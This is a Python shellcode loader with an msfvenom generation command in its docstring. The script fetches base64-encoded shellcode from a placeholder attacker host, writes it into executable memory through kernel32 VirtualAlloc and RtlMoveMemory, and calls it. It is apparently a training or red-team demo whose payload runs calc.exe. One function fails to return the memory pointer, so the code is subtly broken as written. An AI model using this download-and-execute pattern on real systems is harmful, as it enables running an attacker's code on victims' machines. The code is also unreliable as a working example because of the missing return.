"""msfvenom -p windows/exec -e x86/shikata_ga_nai -i 1 -f raw cmd=calc.exe > shellcode.raw
 base64 -w 0 -i shellcode.raw > shellcode.bin"""

from urllib import request

import base64
import ctypes

kernel32 = ctypes.windll.kernel32

def get_code(url):
    with request.urlopen(url) as response:
        shellcode = base64.decodebytes(response.read())

    return shellcode

def write_memory(buf):
    length = len(buf)

    kernel32.VirtualAlloc.restype = ctypes.c_void_p
    kernel32.RtlMoveMemory.argtypes = (
        ctypes.c_void_p,
        ctypes.c_void_p,
        ctypes.c_size_t)

    ptr = kernel32.VirtualAlloc(None,length,0x3000,0x40)
    kernel32.RtlMoveMemory(ptr,buf,length)

def run(shellcode):
    buffer = ctypes.create_string_buffer(shellcode)
    ptr = write_memory(buffer)
    shell_func = ctypes.cast(ptr,ctypes.CFUNCTYPE(None))
    shell_func()

if __name__ == '__main__':
    url = "http://<attacker-ip>/shellcode.bin"
    shellcode = get_code(url)
    run(shellcode)